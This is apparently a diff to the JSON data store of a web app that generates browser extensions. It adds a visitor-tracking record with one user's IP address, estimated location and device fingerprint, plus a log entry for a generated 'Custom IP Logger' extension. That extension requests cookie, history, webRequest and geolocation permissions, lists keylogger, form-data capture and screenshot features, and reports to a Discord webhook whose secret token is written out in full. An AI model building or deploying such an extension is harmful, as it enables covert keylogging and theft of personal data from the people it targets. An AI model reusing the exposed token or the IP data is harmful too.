@@ -28254,6 +28254,59 @@
         "fingerprint": null,
         "timestamp": "2025-09-24T15:10:48.238Z"
       }
+    ],
+    [
+      "18092171-8b03-4be2-8983-91e70802ea3e",
+      {
+        "id": "18092171-8b03-4be2-8983-91e70802ea3e",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "referrer": "https://dc631ddc-421a-4fe0-a55e-d90f468b69d7-00-3irlistgl01wt.spock.replit.dev/extension-generator",
+        "location": "London, England, United Kingdom (Estimated)",
+        "status": "success",
+        "country": "United Kingdom",
+        "region": "England",
+        "city": "London",
+        "latitude": "51.5074",
+        "longitude": "-0.1278",
+        "timezone": "Europe/London",
+        "isp": "Unknown ISP",
+        "organization": "Unknown",
+        "coordinates": "51.5074, -0.1278",
+        "isVpn": "unknown",
+        "isProxy": "unknown",
+        "threatLevel": "Unknown",
+        "vpnProvider": null,
+        "realLocation": null,
+        "deviceType": "desktop",
+        "browserName": "Chrome",
+        "browserVersion": "140.0.0.0",
+        "operatingSystem": "unknown",
+        "osVersion": "unknown",
+        "deviceBrand": "Apple",
+        "deviceModel": "unknown",
+        "architecture": "unknown",
+        "engine": "Blink",
+        "engineVersion": "140.0.0.0",
+        "isBot": false,
+        "isSuspicious": false,
+        "securityFlags": [],
+        "capabilities": [
+          "🌐 WebKit Support",
+          "📸 Screen Capture API",
+          "🎥 WebRTC Advanced",
+          "🔒 WebAssembly SIMD",
+          "📊 Web Share API",
+          "🌍 Web Locks API",
+          "💻 Full DOM Access",
+          "📂 File System API",
+          "🖱️ Pointer Events",
+          "⌨️ Keyboard API"
+        ],
+        "fingerprint": "ZGVza3RvcC1DaHJv",
+        "timestamp": "2025-09-24T15:13:01.606Z"
+      }
     ]
   ],
   "settings": [
@@ -28678,7 +28731,52 @@
       }
     ]
   ],
-  "extensionLogs": [],
-  "timestamp": "2025-09-24T15:10:58.632Z",
+  "extensionLogs": [
+    [
+      "cc5728b5-3329-4bf2-8c37-d19c811ac79a",
+      {
+        "id": "cc5728b5-3329-4bf2-8c37-d19c811ac79a",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "extensionName": "Custom IP Logger",
+        "extensionDescription": "Track visitor information and activity",
+        "extensionVersion": "1.0.0",
+        "permissions": [
+          "activeTab",
+          "storage",
+          "tabs",
+          "cookies",
+          "webRequest",
+          "history",
+          "geolocation",
+          "bookmarks",
+          "notifications"
+        ],
+        "features": [
+          "ip_tracking",
+          "geolocation",
+          "browser_info",
+          "screenshot",
+          "keylogger",
+          "form_data",
+          "click_tracking"
+        ],
+        "webhookUrl": "https://discord.com/api/webhooks/1419031818686169178/98lX9oudbNXapXXM2aQDE7GcAUr3lm0NM1f6qn4whXgB7boAf6dQnWYcT1y5Ni73DmiD",
+        "customCode": "",
+        "generationStatus": "success",
+        "errorMessage": null,
+        "downloadCount": 1,
+        "extensionId": "010f15cc-c096-44dc-8765-ec1af799bd23",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "location": "London, England, United Kingdom (Estimated)",
+        "zipFileSize": 12354,
+        "manifestValid": true,
+        "scriptsValid": true,
+        "createdAt": "2025-09-24T15:13:01.893Z",
+        "lastWebhookSent": null
+      }
+    ]
+  ],
+  "timestamp": "2025-09-24T15:18:28.662Z",
   "version": "2.3"
 }
